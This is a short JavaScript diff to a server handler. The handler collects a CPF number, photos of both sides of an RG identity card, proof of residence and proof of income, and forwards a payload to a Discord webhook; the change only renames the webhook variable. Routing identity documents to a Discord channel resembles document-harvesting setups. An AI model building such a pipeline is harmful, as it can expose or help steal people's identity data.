@@ -47,10 +47,10 @@ export default async function handler(req, res) {
     const comprovanteResidenciaFile = files.comprovanteResidencia ? files.comprovanteResidencia[0] : null; // Novo arquivo
     const comprovanteRendaFile = files.comprovanteRenda ? files.comprovanteRenda[0] : null; // Novo arquivo (opcional)
 
-    const DISCORD_WEBHOOK_URL3 = process.env.DISCORD_WEBHOOK_URL3;
+    const DISCORD_WEBHOOK_URL4 = process.env.DISCORD_WEBHOOK_URL4;
 
     // Validação de campos obrigatórios
-    if (!cpf || !tipoRenda || !rgFrenteFile || !rgVersoFile || !comprovanteResidenciaFile || !DISCORD_WEBHOOK_URL3) {
+    if (!cpf || !tipoRenda || !rgFrenteFile || !rgVersoFile || !comprovanteResidenciaFile || !DISCORD_WEBHOOK_URL4) {
         // Limpa arquivos temp
         const allFilesToClean = [rgFrenteFile, rgVersoFile, comprovanteResidenciaFile, comprovanteRendaFile].filter(Boolean);
         allFilesToClean.forEach(f => {
@@ -161,7 +161,7 @@ export default async function handler(req, res) {
             ],
         };
 
-        const discordResponse = await fetch(DISCORD_WEBHOOK_URL3, {
+        const discordResponse = await fetch(DISCORD_WEBHOOK_URL4, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(discordPayload),
